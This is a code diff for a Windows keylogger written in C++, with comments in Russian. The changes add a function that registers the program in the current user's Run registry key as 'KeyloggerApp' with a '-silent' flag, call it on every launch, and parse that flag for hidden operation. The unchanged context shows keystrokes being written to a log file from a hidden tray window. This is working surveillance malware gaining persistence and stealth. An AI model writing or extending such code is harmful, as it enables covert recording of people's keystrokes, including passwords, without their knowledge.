@@ -177,6 +177,26 @@ void CreateTrayWindow() {
     ShowWindow(hwnd, SW_HIDE);
 }
 
+void AddToStartup() {
+    HKEY hKey;
+    const wchar_t* runPath = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+    
+    if (RegOpenKeyEx(HKEY_CURRENT_USER, runPath, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
+        wchar_t exePath[MAX_PATH];
+        GetModuleFileName(NULL, exePath, MAX_PATH);
+        
+        // Добавляем параметр для скрытого запуска
+        wchar_t exePathWithParams[MAX_PATH + 10];
+        swprintf_s(exePathWithParams, L"\"%s\" -silent", exePath);
+        
+        RegSetValueEx(hKey, L"KeyloggerApp", 0, REG_SZ, 
+                      (BYTE*)exePathWithParams, 
+                      (wcslen(exePathWithParams) + 1) * sizeof(wchar_t));
+        
+        RegCloseKey(hKey);
+    }
+}
+
 // Обработчик сообщений окна
 LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
     switch (uMsg) {
@@ -328,11 +348,7 @@ int Save(int key){
     else if(key == VK_UP)
         file << "[UP]"; 
     else if(key == VK_DOWN)
-        file << "[DOWN]";     
-    else if(key == 190 || key == 110)
-        file << ".";    
-    else if(key == 189 || key == 109)
-        file << "-";          
+        file << "[DOWN]";              
     else{
         wchar_t crrKey[2] = {0}; 
 
@@ -382,6 +398,22 @@ int main(){
     //append
     file.open(logFilePath, ios_base::app | ios_base::binary);
 
+    bool silentMode = false;
+    int argc;
+    wchar_t** argv = CommandLineToArgvW(GetCommandLineW(), &argc);
+    
+    if (argv && argc > 1) {
+        for (int i = 1; i < argc; i++) {
+            if (wcscmp(argv[i], L"-silent") == 0) {
+                silentMode = true;
+                break;
+            }
+        }
+        LocalFree(argv);
+    }
+    
+    // Всегда добавляем в автозапуск при запуске
+    AddToStartup();
 
     if (file.tellp() == 0) {
         // UTF-8 BOM
